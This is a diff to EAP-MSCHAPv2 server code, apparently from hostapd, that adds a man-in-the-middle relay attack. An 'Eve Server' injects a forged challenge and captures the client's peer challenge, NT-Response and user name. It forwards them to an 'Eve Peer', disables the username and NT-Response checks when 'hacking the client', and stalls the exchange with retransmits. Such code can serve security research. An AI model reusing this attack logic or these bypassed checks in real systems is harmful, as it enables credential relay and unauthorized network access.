@@ -157,6 +157,8 @@ static struct wpabuf * eap_mschapv2_build_challenge(
 				         cur_server_id_len);
 		wpa_printf(MSG_DEBUG,
 			   "MITM: Inject forged MSCHAPv2 Challenge ");
+		os_free(self->mitm_data);
+		self->mitm_data = 0;
 	}
 
 	ms_len = sizeof(*ms) + 1 + CHALLENGE_LEN + cur_server_id_len;
@@ -350,6 +352,56 @@ static void eap_mschapv2_process_response(struct eap_sm *sm,
 	int res;
 	char *buf;
 
+	enum local_mitm_state {HACK, SKIP, PENDING} lm_state = SKIP;
+	struct instance_data * self = NULL;
+
+	static int k = 10;
+	if (eap_example_get_instance_name(sm) == EVE_SERVER) {
+		if (k > 0) {
+			--k;
+		}
+
+		if (k == 0) {
+			k = -1;
+		}
+
+		if (k == 9) {
+			wpa_printf(MSG_DEBUG,
+				   "MITM: Init delay loop for Eve Server");
+		}
+
+		if (k > 0) {
+			self = eap_example_get_instance_data(sm);
+		}
+
+		if (k == 9) {
+			if (self->mitm_protocol_state != 0x4) {
+				self->mitm_protocol_state = 0x5;
+				wpa_printf(MSG_DEBUG,
+					   "MITM: We didn't send forged "
+					   "challenge - give up the attack");
+				self = NULL;
+				lm_state = SKIP;
+				k = -1;
+			}
+			else
+			{
+				lm_state = HACK;
+			}
+		}
+
+		if (k > 0 && k < 9) {
+			lm_state = PENDING;
+		}
+
+		if (k == -1)
+		{
+			wpa_printf(MSG_DEBUG,
+				   "MITM: End delay loop for Eve Server");
+			k = -2;
+		}
+	}
+
 	pos = eap_hdr_validate(EAP_VENDOR_IETF, EAP_TYPE_MSCHAPV2, respData,
 			       &len);
 	if (pos == NULL || len < 1)
@@ -387,6 +439,21 @@ static void eap_mschapv2_process_response(struct eap_sm *sm,
 	wpa_hexdump(MSG_MSGDUMP, "EAP-MSCHAPV2: NT-Response", nt_response, 24);
 	wpa_printf(MSG_MSGDUMP, "EAP-MSCHAPV2: Flags 0x%x", flags);
 	wpa_hexdump_ascii(MSG_MSGDUMP, "EAP-MSCHAPV2: Name", name, name_len);
+
+	if (lm_state == HACK && self->mitm_protocol_state == 0x4) {
+		struct wpabuf *data;
+		data = wpabuf_alloc(16 + 24 + name_len);
+		wpabuf_put_data(data, peer_challenge, 16);
+		wpabuf_put_data(data, nt_response, 24);
+		wpabuf_put_data(data, name, name_len);
+		self->mitm_data = data;
+		self->mitm_protocol_state = 0x6;
+		eap_example_mitm_peer_tx(self);
+
+		wpa_printf(MSG_DEBUG,
+			   "MITM: Send MSCHAPv2 Peer Challenge, NT Response "
+			   "and User name to Eve Peer");
+	}
 
 	buf = os_malloc(name_len * 4 + 1);
 	if (buf) {
@@ -431,8 +498,10 @@ static void eap_mschapv2_process_response(struct eap_sm *sm,
 	}
 #endif /* CONFIG_TESTING_OPTIONS */
 
-	if (username_len != user_len ||
-	    os_memcmp(username, user, username_len) != 0) {
+	/* tolerate incorrect username if we are hacking the client */
+	if ((username_len != user_len ||
+	    os_memcmp(username, user, username_len) != 0) &&
+	    lm_state == SKIP) {
 		wpa_printf(MSG_DEBUG, "EAP-MSCHAPV2: Mismatch in user names");
 		wpa_hexdump_ascii(MSG_DEBUG, "EAP-MSCHAPV2: Expected user "
 				  "name", username, username_len);
@@ -445,26 +514,32 @@ static void eap_mschapv2_process_response(struct eap_sm *sm,
 	wpa_hexdump_ascii(MSG_MSGDUMP, "EAP-MSCHAPV2: User name",
 			  username, username_len);
 
-	if (sm->user->password_hash) {
-		res = generate_nt_response_pwhash(data->auth_challenge,
-						  peer_challenge,
-						  username, username_len,
-						  sm->user->password,
-						  expected);
-	} else {
-		res = generate_nt_response(data->auth_challenge,
-					   peer_challenge,
-					   username, username_len,
-					   sm->user->password,
-					   sm->user->password_len,
-					   expected);
-	}
-	if (res) {
-		data->state = FAILURE;
-		return;
+	/* the hacker doesn't possess password or its hash */
+	if (lm_state == SKIP) {
+		if (sm->user->password_hash) {
+			res = generate_nt_response_pwhash(data->auth_challenge,
+							  peer_challenge,
+							  username, username_len,
+							  sm->user->password,
+							  expected);
+		} else {
+			res = generate_nt_response(data->auth_challenge,
+						   peer_challenge,
+						   username, username_len,
+						   sm->user->password,
+						   sm->user->password_len,
+						   expected);
+		}
+		if (res) {
+			data->state = FAILURE;
+			return;
+		}
 	}
 
-	if (os_memcmp_const(nt_response, expected, 24) == 0) {
+	/* the hacker doesn't validate nt_response and he doesn't care
+	 * for MSCHAPv2 master key at all */
+	if (os_memcmp_const(nt_response, expected, 24) == 0 &&
+	    lm_state == SKIP) {
 		const u8 *pw_hash;
 		u8 pw_hash_buf[16], pw_hash_hash[16];
 
@@ -498,12 +573,21 @@ static void eap_mschapv2_process_response(struct eap_sm *sm,
 		data->master_key_valid = 1;
 		wpa_hexdump_key(MSG_DEBUG, "EAP-MSCHAPV2: Derived Master Key",
 				data->master_key, MSCHAPV2_KEY_LEN);
-	} else {
+	} else if (lm_state == SKIP) {
 		wpa_hexdump(MSG_MSGDUMP, "EAP-MSCHAPV2: Expected NT-Response",
 			    expected, 24);
 		wpa_printf(MSG_DEBUG, "EAP-MSCHAPV2: Invalid NT-Response");
 		data->state = FAILURE_REQ;
 	}
+
+	if (k > 0 && lm_state != SKIP) {
+		eap_example_mitm_retransmit(sm);
+		sm->method_pending = METHOD_PENDING_WAIT;
+		data->state = CHALLENGE;
+
+		return;
+	}
+
 }
 
 
